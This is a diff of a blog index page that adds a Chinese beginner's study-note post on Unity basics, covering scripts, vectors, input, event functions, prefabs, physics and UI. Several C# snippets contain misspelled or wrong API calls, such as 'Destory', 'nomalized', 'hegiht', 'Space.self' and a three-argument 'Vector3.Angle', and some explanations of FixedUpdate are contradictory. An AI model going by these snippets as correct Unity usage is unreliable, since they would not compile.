@@ -116,7 +116,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">48</span>
+          <span class="site-state-item-count">51</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -152,6 +152,459 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/01/unity%E5%85%A5%E9%97%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="甜药补习班吊尾生">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="划水骗分二十年，没人比我更懂蒻">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/05/01/unity%E5%85%A5%E9%97%A8/" class="post-title-link" itemprop="url">unity入门</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-05-01 14:18:38" itemprop="dateCreated datePublished" datetime="2021-05-01T14:18:38+08:00">2021-05-01</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2021-09-11 23:16:41" itemprop="dateModified" datetime="2021-09-11T23:16:41+08:00">2021-09-11</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h4 id="网格">网格</h4>
+<p>每一个代表为1Unit（对应屏幕上的100像素点）</p>
+<h4 id="摄像机的几个参数">摄像机的几个参数：</h4>
+<p>Z坐标：默认是-10，不用修改 Background，最底层背景色 Size广角，指摄影范围，默认5个单位 其中，5Unit为半高，全高为10Unit ,是摄影范围的高度 长宽比 在Game（游戏）窗口中调整 若要1080p分辨率：长1920像素点，宽1080像素点，则Size=5.4，比例为FH</p>
+<h4 id="游戏对象">游戏对象</h4>
+<p>隐藏/显示 操作在Inspector（检察器）上方的打勾栏 图层顺序越小在越底下 对象轴心（Pivot）修改：在下方文件文件夹中选择素材，右栏中打开sprite editor 父子关系：在左栏拖动完成。子坐标是相对于父的。 一个游戏对象可以拥有不同素材/造型，在右栏sprite renderers可添加造型 sprite renderers是一个组件，功能是显示图片</p>
+<h4 id="图片素材">图片素材：</h4>
+<p>背景一般为jpg图片，其它一般为png图片。 素材切割：在下方文件文件夹中选择素材，在右栏sprite mode设为multiple，打开sprite editor，执行切割，切割后的素材展开可分别拖出。</p>
+<h4 id="创建一个空对象">创建一个空对象</h4>
+<p>在左栏某个场景下可以创建 对象可以添加不同组件</p>
+<h4 id="游戏脚本">游戏脚本</h4>
+<p>最好在下栏新建文件夹用于存放脚本 这是一个文件名叫Hello的脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">using System.Collections;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using UnityEngine;</span><br><span class="line"></span><br><span class="line">public class Hello : MonoBehaviour			//继承于MonoBehaviour的父类，这个父类由unity提供</span><br><span class="line">&#123;</span><br><span class="line">    float stepout = 0.8f;		//unity一般使用float类型; public属性才能被检查器看得到，能修改</span><br><span class="line">    void Start()							//在游戏开始时被调用</span><br><span class="line">    &#123;</span><br><span class="line">        Debug.Log(&quot;这是我的第一个游戏&quot;);			//于控制台中输出，注意区分大小写</span><br><span class="line">        Application.targetFrameRate = 60;		//尽量以60FPS运行</span><br><span class="line">        GameObject obj22 = GameObject.Find(&quot;/22&quot;);	//创建一个节点变量并获取一个节点</span><br><span class="line">        SpriteRenderer s22 = obj22.GetComponent&lt;SpriteRenderer&gt;();	//创建一个精灵编辑变量并获取某个节点的精灵编辑</span><br><span class="line">        s22.flipX = true;	//水平翻转</span><br><span class="line">        SpriteRenderer splane1 = GetComponent&lt;SpriteRenderer&gt;();	//因为这个脚本挂载在该对象下，有些东西默认</span><br><span class="line">        splane1.flipY = true;</span><br><span class="line">        transform.position =new Vector3(0,0,0);//出现在某个坐标</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void Update()						//每一帧调用一次</span><br><span class="line">    &#123;</span><br><span class="line">        Debug.Log(&quot;In Updata() ... &quot; + Time.deltaTime);//调用间隔</span><br><span class="line">        float step = stepout * Time.deltaTime;//为了达到匀速前进，且deltaTime不能再外调用</span><br><span class="line">        transform.Translate(0, step, 0, Space.self);//组件，方法，x，y，z，沿自己的坐标系（自己为原点），改成Space.World是沿着世界坐标系</span><br><span class="line">        transform.eulerAngles += new Vector3(0, 0, 100*step);//旋转</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>将脚本挂载到游戏对象：于游戏对象的检查器中添加脚本组件，或者直接拖动 关于脚本： 1.类名必须和文件名相同 2.必须继承于MonoBehaviour，所有unity脚本都继承于这个类 3.默认定义了一些事件函数，如：Start(),Updata,会被unity引擎自动调用 脚本在引擎内部执行顺序： 1.创建游戏对象 2.创建组件，比如Hello sjtql = new hello(); 3.sjtql.Start() 4.定时执行sjtql.Updata()更新游戏显示 5.一个脚本可以挂载在多个对象上，一个对象也可以挂载多个脚本</p>
+<h4 id="父节点和子节点的修改">父节点和子节点的修改：</h4>
+<p>transform用于设置位置、大小、旋转，也可以用于维护父子节点关系 例子“脚本挂载在阴影，阴影的父节点为角色”</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">using System.Collections;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using UnityEngine;</span><br><span class="line">public class shadow22 : MonoBehaviour</span><br><span class="line">&#123;</span><br><span class="line">    void Start()</span><br><span class="line">    &#123;</span><br><span class="line">        GameObject shadow = transform.parent.gameObject;</span><br><span class="line">        Debug.Log(&quot;shadow22的父节点：&quot; + transform.parent.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>例子遍历所有子节点(不包括子节点的子节点)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">using System.Collections;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using UnityEngine;</span><br><span class="line">public class children : MonoBehaviour</span><br><span class="line">&#123;</span><br><span class="line">	void Start()</span><br><span class="line">	&#123;</span><br><span class="line">		foreach(Transform child in transform)//定义一个名字叫child（也可以叫别的）的Tsf型变量</span><br><span class="line">        &#123;</span><br><span class="line">            Debug.Log(&quot;子节点名：&quot; + child.name);</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>修改节点父子关系</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">be.transform.SetParent(sj.transform);//be，sj是两个节点</span><br><span class="line">sj.transform.SetParent(null);//sj的无父节点，直接挂载在场景下</span><br></pre></td></tr></table></figure>
+<h4 id="组件属性">组件属性</h4>
+<p>只有public的属性才能在检查器（inspector）中显示</p>
+<h4 id="脚本单步调试">脚本单步调试</h4>
+<p>在VS里，添加断点 在VS里，点击附加到unity 在untiy里，点play 在VS里，点Step Over（F10）单步调试 在VS里，点停止调试，使得VS与unity分离。（此时并没有停止游戏，只是停止调试让它自由运行）</p>
+<h4 id="坐标与旋转">坐标与旋转</h4>
+<p>Vector3是一个类，用于表示一个3维向量（x，y，z），也称为3元数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Vector3 be = new Vector3(0,0.1f,0);//结构体的实体化</span><br><span class="line">transform.position =new Vector3(0,0.1f,0);//出现在某个坐标</span><br><span class="line">transform.localposition =new Vector3(0,0.1f,0);//已父节点为原点计算</span><br></pre></td></tr></table></figure>
+<h4 id="向量">向量</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Vector3 be = new Vector3(3,4,0);//be.magnitude返回向量长度</span><br><span class="line">Vector3 sj = be.nomalized; //sj=(0.6,0.8,0)化为标准向量</span><br><span class="line">float zzl = Vector3.SignedAngle(b,a,Vector3.forward);//返回a向量逆时针旋转到b向量划过的角度，以z轴作为旋转轴</span><br><span class="line">//Vector3.right=(1,0,0)			Vector3.up=(0,1,0)		Vector3.forward=(0,0,1)</span><br><span class="line">float zzl = Vector3.Angle(b,a,Vector3.forward);//不带正负号</span><br></pre></td></tr></table></figure>
+<h4 id="物体的指向">物体的指向</h4>
+<p>transform.right<br>
+transform.up<br>
+transform.forward 代表某物体的x，y，z轴的指向 这3个都是标准向量</p>
+<p>让物体1指向另一个物体2 方法一：两个物体向量相减，得出方向向量，修改物体1的指向 方法二：两个物体向量相减，得出方向向量，再算物体1和方向向量的夹角，旋转物体1 transform.Rotate(0,0,angle)</p>
+<p>例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">void Start()</span><br><span class="line">&#123;</span><br><span class="line">    Application.targetFrameRate = 60;</span><br><span class="line">    GameObject target = GameObject.Find(&quot;plane&quot;);</span><br><span class="line">    Vector3 d = target.transform.position - transform.position;</span><br><span class="line">    float angle = Vector3.SignedAngle(transform.up, d, Vector3.forward);</span><br><span class="line">    transform.Rotate(0, 0, angle);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="屏幕坐标摄像机拍摄出的画面">屏幕坐标（摄像机拍摄出的画面）</h4>
+<p>左下角为原点，像素点为单位 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int a= Screen.width;	//获取屏幕宽度，单位：像素点</span><br><span class="line">int b= Screen.hegiht;	//获取屏幕高度</span><br><span class="line">Vector3 c = transform.position;	//获取坐标</span><br><span class="line">Vector3 d = Camera.main.WorldToScreenPoint(c);	//坐标转化</span><br><span class="line">Vector3 c = Camera.main.ScreenToWorldPoint(d);	//坐标转化</span><br><span class="line">c.z=0;//屏幕坐标转化为世界坐标时需要将z坐标转化为零</span><br></pre></td></tr></table></figure></p>
+<p>判断一个物体是否到边界，应该用屏幕坐标</p>
+<h4 id="鼠标事件">鼠标事件</h4>
+<p>区分： Input.GetMouseButtonDown(0) 检查鼠标按下事件 Input.GetMouseButtonUp(0) 检查鼠标抬起事件 Input.GetMouseButton(0) 检查鼠标状态 ( 是否是按下状态 ) 其中，前两个事件不会重复触发 0代表左键，1代表右键，2代表中键 验证：保持鼠标一直按下，观察打印输出</p>
+<p><strong>所有的输入都在Input当中</strong> 例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if (Input.GetMouseButtonDown(0))</span><br><span class="line">&#123;</span><br><span class="line">	Debug.Log(&quot;鼠标按下的位置的屏幕坐标&quot;+Input.mousePosition);</span><br><span class="line">&#125;</span><br><span class="line">if (Input.GetMouseButtonUp(0))</span><br><span class="line">&#123;</span><br><span class="line">	Debug.Log(&quot;鼠标抬起的位置的屏幕坐标&quot;+Input.mousePosition);</span><br><span class="line">&#125;</span><br><span class="line">if (Input.GetMouseButton(0))</span><br><span class="line">&#123;</span><br><span class="line">	Debug.Log(&quot;鼠标左键正在被按下&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>鼠标按下物体跟随做法：判断按下，记录坐标，物体朝目的坐标前进 鼠标拖拽物体做法：判断按下，记录鼠标坐标，判断鼠标坐标与物体坐标是否接触，如果接触，让物体出现在鼠标坐标</p>
+<p>鼠标事件有优化</p>
+<h4 id="事件函数">事件函数</h4>
+<p>1.Awake() 2.OnEnable() 3.Start()</p>
+<p>比较，当脚本组件被禁用时：只有Awake()会被调用。</p>
+<p>Start()只会调用一次</p>
+<p>OnEnable()在每次被启动时都会被调用一次</p>
+<h4 id="脚本执行顺序">脚本执行顺序</h4>
+<p>第一层顺序：先执行所有脚本的Awake 再执行左右脚本的OnEnable 再执行所有脚本的Start 第二层顺序：选中脚本在检查器中找执行顺序，添加需要脚本，设定执行参数，越小越前</p>
+<p>接下来针对每个方法进行详细的说明</p>
+<p>1.Awake 用于在游戏开始之前初始化变量或游戏状态。在脚本整个生命周期内它仅被调用一次.Awake在所有对象被初始化之后调用，所以你可以安全的与其他对象对话或用诸如GameObject.FindWithTag()这样的函数搜索它们。每个游戏物体上的Awake以随机的顺序被调用。因此，你应该用Awake来设置脚本间的引用，并用Start来传递信息Awake总是在Start之前被调用。它不能用来执行协同程序。</p>
+<p>2.Start 仅在Update函数第一次被调用前调用。Start在behaviour的生命周期中只被调用一次。它和Awake的不同是Start只在脚本实例被启用时调用。你可以按需调整延迟初始化代码。Awake总是在Start之前执行。这允许你协调初始化顺序。在所有脚本实例中，Start函数总是在Awake函数之后调用。</p>
+<p>3.FixedUpdate 固定帧更新，在Unity导航菜单栏中，点击“Edit”--&gt;“Project Setting”--&gt;“Time”菜单项后，右侧的Inspector视图将弹出时间管理器，其中“Fixed Timestep”选项用于设置FixedUpdate()的更新频率，更新频率默认为0.02s。</p>
+<p>4.Update 正常帧更新，用于更新逻辑。每一帧都执行，处理Rigidbody时，需要用FixedUpdate代替Update。例如:给刚体加一个作用力时，你必须应用作用力在FixedUpdate里的固定帧，而不是Update中的帧。(两者帧长不同)FixedUpdate，每固定帧绘制时执行一次，和update不同的是FixedUpdate是渲染帧执行，如果你的渲染效率低下的时候FixedUpdate调用次数就会跟着下降。FixedUpdate比较适用于物理引擎的计算，因为是跟每帧渲染有关。Update就比较适合做控制。 Update()与FixedUpdate()的区别 从字面上理解，它们都是在更新时会被调用，并且会循环的调用。但是Update会在每次渲 染新的一帧时，被调用。而FixedUpdate会在每个固定的时间间隔被调用，那么要是Update 和FixedUpdate的时间间隔一样，是不是就一样呢？答案是不一定，因为Update受当前渲染的物体，更确切的说是三角形的数量影响，有时快有时 慢，帧率会变化，update被调用的时间间隔就发生变化。但是FixedUpdate则不受帧率的变化，它是以固定的时间间隔来被调用，那么这个时间间 隔怎么设置呢？Edit-&gt;Project Setting-&gt;time下面的Fixed timestep。</p>
+<p>5.LateUpdate 在所有Update函数调用后被调用，和fixedupdate一样都是每一帧都被调用执行，这可用于调整脚本执行顺序。例如:当物体在Update里移动时，跟随物体的相机可以在LateUpdate里实现。LateUpdate,在每帧Update执行完毕调用，他是在所有update结束后才调用，比较适合用于命令脚本的执行。官网上例子是摄像机的跟随，都是在所有update操作完才跟进摄像机，不然就有可能出现摄像机已经推进了，但是视角里还未有角色的空帧出现。 Update和LateUpdate的区别 在圣典里LateUpdate被解释成一句话,LateUpdate是在所有Update函数调用后被调用。这可用于调整脚本执行顺序。例如:当物体在Update里移动时，跟随物体的相机可以在LateUpdate里实现。 LateUpdate是晚于所有Update执行的。例如：游戏中有2个脚本，脚本1含有Update和LateUpdate，脚本2含有Update，那么当游戏执行时，每一帧都是把2个脚本中的Update执行完后才执行LateUpdate 。虽然是在同一帧中执行的，但是Update会先执行，LateUpdate会晚执行。 现在假设有2个不同的脚本同时在Update中控制一个物体，那么当其中一个脚本改变物体方位、旋转或者其他参数时，另一个脚步也在改变这些东西，那么这个物体的方位、旋转就会出现一定的反复。如果还有个物体在Update中跟随这个物体移动、旋转的话，那跟随的物体就会出现抖动。 如果是在LateUpdate中跟随的话就会只跟随所有Update执行完后的最后位置、旋转，这样就防止了抖动。</p>
+<p>6.OnGUI 在渲染和处理GUI事件时调用。比如：你画一个button或label时常常用到它。这意味着OnGUI也是每帧执行一次。</p>
+<p>7.Reset 在用户点击检视面板的Reset按钮或者首次添加该组件时被调用。此函数只在编辑模式下被调用。Reset最常用于在检视面板中给定一个默认值。</p>
+<p>8.OnDisable 当物体被销毁时 OnDisable将被调用，并且可用于任意清理代码。脚本被卸载时，OnDisable将被调用，OnEnable在脚本被载入后调用。注意： OnDisable不能用于协同程序。</p>
+<p>9.OnDestroy 当MonoBehaviour将被销毁时，这个函数被调用。OnDestroy只会在预先已经被激活的游戏物体上被调用。注意：OnDestroy也不能用于协同程序。</p>
+<h4 id="引用类型参数">引用类型参数</h4>
+<p>public Sprite be0; public Sprite be1; public GameObject be3; 之后可以在unity界面拖动赋值</p>
+<h4 id="预制体">预制体</h4>
+<p>1.先在场景上做好一个游戏对象 2.在层级管理器把游戏对象直接拖到Project窗口，则生成一个预制体资源*.prefab 3.给预制体改个名字，以免混淆，重要！！！！！</p>
+<p>主预制体单独编辑，同步更新所有预制体；预制体的一个实例修改，可选应用到主预制体；可选择某个预制体的实例，使其脱离预制体成为一个单独的游戏对象</p>
+<h4 id="动态创建实例">动态创建实例</h4>
+<p>1 添加脚本，挂载</p>
+<p>2 添加公共变量 public GameObject myPrefab;</p>
+<p>3 在 Inspector 中引用资源 预制体可添加到节点上</p>
+<p>4 当点击鼠标时，创建一个子弹的实例</p>
+<p>GameObject bullet = Instantiate(myPrefab);</p>
+<p>bullet.transform.position = transform.position + new Vector3(0, 1f, 0);</p>
+<p>其中，Instantiate() 方法根据一个 Prefab ，来创建一个实例，返回值就是创建出来的GameObject 。</p>
+<p>5 运行游戏 在 Hierarchy 窗口中，观察新创建的实例</p>
+<p>Instantiate() 重载了很多版本，常用的如下：</p>
+<p>bullet = Instantiate(myPrefab)</p>
+<p>创建一个实例，position与rotation与当前游戏对象相当，挂载场景根节点下</p>
+<p>bullet = Instantiate(myPrefab, Transform parent )</p>
+<p>创建一个实例，position与rotation与当前游戏对象相当，同时指定父节点</p>
+<p>bullet = Instantiate(myPrefab, position, rotation)</p>
+<p>创建一个实例，挂载场景根节点下，同时指定 position与rotation</p>
+<p>例如，</p>
+<p>bullet = Instantiate(myPrefab, transform.position, transform.rotation)</p>
+<p>bullet = Instantiate(myPrefab, position, rotation, Transform parent)</p>
+<p>创建一个实例，挂载 parent 节点下，同时指定 position与rotation</p>
+<h4 id="实例销毁">实例销毁</h4>
+<p>例子，当子弹飞出视野之后，销毁实例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Vector3 sp = Camera.main.WorldToScreenPoint(transform.position);</span><br><span class="line">if (sp.y &gt; Screen.height)</span><br><span class="line">&#123;</span><br><span class="line">    GameObject.Destory(gameObject);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="定时器">定时器</h4>
+<p>Time.deltaTime、累计和if语句实现</p>
+<h4 id="键盘事件">键盘事件</h4>
+<p>Input.GetKeyDown(KeyCode.Tab) Input.GetKeyUp(KeyCode.Tab) Input.GetKey(KeyCode.Tab) 和鼠标事件很像</p>
+<p>Backspace 退格键 Delete Delete键 Tab TabTab键 Clear Clear键 Return 回车键 Pause 暂停键 Escape ESC键 Space 空格键</p>
+<p>Keypad0 小键盘0 Keypad1 小键盘1 Keypad2 小键盘2 Keypad3 小键盘3 Keypad4 小键盘4</p>
+<p>KeypadPeriod 小键盘“.” KeypadDivide 小键盘“/” KeypadMultiply 小键盘“*” KeypadMinus 小键盘“-” KeypadPlus 小键盘“+” KeypadEnter 小键盘“Enter” KeypadEquals 小键盘“=”</p>
+<p>UpArrow 方向键上 DownArrow 方向键下 RightArrow 方向键右 LeftArrow 方向键左</p>
+<p>F1 功能键 F1 F2 功能键 F2 F3 功能键 F3 F4 功能键 F4 F5 功能键 F5</p>
+<p>Alpha0 按键0 Alpha1 按键1 Alpha2 按键2 Alpha3 按键3 Alpha4 按键4 Alpha5 按键5</p>
+<p>A ‘a’键 B ‘b’键 C ‘c’键 D ‘d’键 E ‘e’键 F ‘f’键</p>
+<p>Capslock 大小写锁定键 RightShift 右上档键 LeftShift 左上档键 RightControl右Ctrl键 LeftControl左Ctrl键 RightAlt 右Alt键 LeftAlt 左Alt键</p>
+<p>Mouse0 鼠标左键 Mouse1 鼠标右键 Mouse2 鼠标中键 Mouse3 鼠标第3个按键 Mouse4 鼠标第4个按键</p>
+<h4 id="物理系统">物理系统</h4>
+<p>在组件里可添加物理组件</p>
+<p>刚体有3种类型 Dinamic 普通刚体 有质量有速度 Static 静态刚体 质量无穷大、无速度 适用于建筑物、地面等固定不动的物体 Kinematic 运动学刚体 无质量 忽略物理规律的刚体，一般用于检测</p>
+<p><strong>碰撞</strong>需要添加碰撞组件 碰撞组件和刚体组件一般一起出现 碰撞范围可编辑 可以给刚体添加材质（<strong>材质</strong>可设置弹性系数、摩擦系数，可以在资源栏里新建）（用边缘行碰撞组件可以设定多边形碰撞范围）</p>
+<p>碰撞组件中有触发器</p>
+<p>脚本</p>
+<p>void OnTriggerEnter2D(Collider2D collision) { Debug.Log("飞机：探测到了碰撞 ... "); }</p>
+<p>碰撞事件回调，有三个：</p>
+<p>OnTriggerEnter2D ：两个碰撞体开始相遇</p>
+<p>OnTriggerStay2D ： 两个碰撞体接触中</p>
+<p>OnTriggerExit2D： 两个碰撞体分开</p>
+<p>碰撞事件的参数: Collider2D collision ，表示的是对方的碰撞体组件</p>
+<p>例如，</p>
+<p>collision.gameObject 对方</p>
+<p>collision.transform 对方的Transform组件</p>
+<p>collision.name 对方节点的名称</p>
+<p>collision.tag 对方节点的Tag</p>
+<p>在 OnTriggerEnter2D 中 ，Destroy(collision.gameObject) 销毁对象</p>
+<p>相应的回调名字：</p>
+<p>OnCollisionEnter ，OnCollisionStay ，OnCollisionExit</p>
+<h4 id="标签">标签</h4>
+<p>在碰撞事件中可以检测碰撞对象的标签，区分敌人和队友</p>
+<p>if(collision.tag.Equals("Enemy")) {</p>
+<p>}</p>
+<h4 id="layer">Layer</h4>
+<p>可以在项目设定里编辑，碰撞是否检测</p>
+<h4 id="随机">随机</h4>
+<p>Random.Range(-2,2);</p>
+<p>左闭右开</p>
+<h4 id="重复调用">重复调用</h4>
+<p>InvokeRepeating("be",delay,jiange);//字符串：函数名，第一次延时，间隔</p>
+<h4 id="随机选择头像">随机选择头像</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public sprite[] be;</span><br><span class="line">int sj = Random.Range(0,8);</span><br><span class="line">SpriteRenderer wlw = enemy.Getcomponent&lt;SpriteRenderer&gt;();</span><br><span class="line">wlw.Sprite = be[index];</span><br></pre></td></tr></table></figure>
+<h4 id="游戏背景">游戏背景</h4>
+<h4 id="声音">声音</h4>
+<p>支持格式mp3/wav/ogg/aiff</p>
+<p>分为声音播放者和声音采集者</p>
+<p>默认情况下camera自带了一个声音采集者</p>
+<p>声源是组件</p>
+<h4 id="延时调用">延时调用</h4>
+<p>Invoke("be",3); 3秒后调用</p>
+<p>invoke API很有用，去官方手册查</p>
+<h4 id="ui">UI</h4>
+<p>​ 添加Canvas画布，用于摆放所有的GUI元素</p>
+<p>​ Canvas和eventsystem系统配合使用</p>
+<p>​ 修改Canvas参数：</p>
+<p>​ 渲染模式：摄像机。还有其余的渲染模式</p>
+<p>​ 渲染摄像机</p>
+<p>​ 平面距离摄像机距离</p>
+<p>​ Canvas节点下添加ui元素</p>
+<p>​ rect transform（transform的子类）</p>
+<p>​ 相对中心点的位置，单位：像素</p>
+<p>​ 相对中心点可修改，选已有的模板，或者修改Anchors</p>
+<p>​ image：填充模式九宫格边角美化：在素材中sprite editor 改出九宫格</p>
+<p>​ 按钮自定义按下特性：将transition改为图片切换模式</p>
+<p>​ 文本输入框</p>
+<p>​ 面板panel，人称小画布（Canvas）</p>
+<p>​ using Unityengine.UI;</p>
+<p>​ InputField类型变量获取文本输入框内容，string sj = be.text</p>
+<p>​ on click()下添加方法</p>
+<p>​ 图片转按钮：挂载脚本，脚本：创建方法继承已有的类： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">using UnityEngine;</span><br><span class="line">using UnityEngine.EventSystems;</span><br><span class="line"></span><br><span class="line">/** 事件列表</span><br><span class="line">IPointerEnterHandler - OnPointerEnter - Called when a pointer enters the object</span><br><span class="line">IPointerExitHandler - OnPointerExit - Called when a pointer exits the object</span><br><span class="line">IPointerDownHandler - OnPointerDown - Called when a pointer is pressed on the object</span><br><span class="line">IPointerUpHandler - OnPointerUp - Called when a pointer is released (called on the GameObject that the pointer is clicking)</span><br><span class="line">IPointerClickHandler - OnPointerClick - Called when a pointer is pressed and released on the same object</span><br><span class="line">IInitializePotentialDragHandler - OnInitializePotentialDrag - Called when a drag target is found, can be used to initialise values</span><br><span class="line">IBeginDragHandler - OnBeginDrag - Called on the drag object when dragging is about to begin</span><br><span class="line">IDragHandler - OnDrag - Called on the drag object when a drag is happening</span><br><span class="line">IEndDragHandler - OnEndDrag - Called on the drag object when a drag finishes</span><br><span class="line">IDropHandler - OnDrop - Called on the object where a drag finishes</span><br><span class="line">IScrollHandler - OnScroll - Called when a mouse wheel scrolls</span><br><span class="line">IUpdateSelectedHandler - OnUpdateSelected - Called on the selected object each tick</span><br><span class="line">ISelectHandler - OnSelect - Called when the object becomes the selected object</span><br><span class="line">IDeselectHandler - OnDeselect - Called on the selected object becomes deselected</span><br><span class="line">IMoveHandler - OnMove - Called when a move event occurs (left, right, up, down, ect)</span><br><span class="line">ISubmitHandler - OnSubmit - Called when the submit button is pressed</span><br><span class="line">ICancelHandler - OnCancel - Called when the cancel button is pressed</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">public class OkButton : MonoBehaviour, IPointerDownHandler, IPointerUpHandler</span><br><span class="line">&#123;</span><br><span class="line">    // Start is called before the first frame update</span><br><span class="line">    void Start()</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Update is called once per frame</span><br><span class="line">    void Update()</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void OnPointerDown(PointerEventData eventData)</span><br><span class="line">    &#123;</span><br><span class="line">        Debug.Log(&quot;鼠标按下...&quot;);</span><br><span class="line">        transform.localScale = new Vector3(1.05f, 1.05f, 1.05f);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void OnPointerUp(PointerEventData eventData)</span><br><span class="line">    &#123;</span><br><span class="line">        transform.localScale = new Vector3(1, 1, 1);</span><br><span class="line">    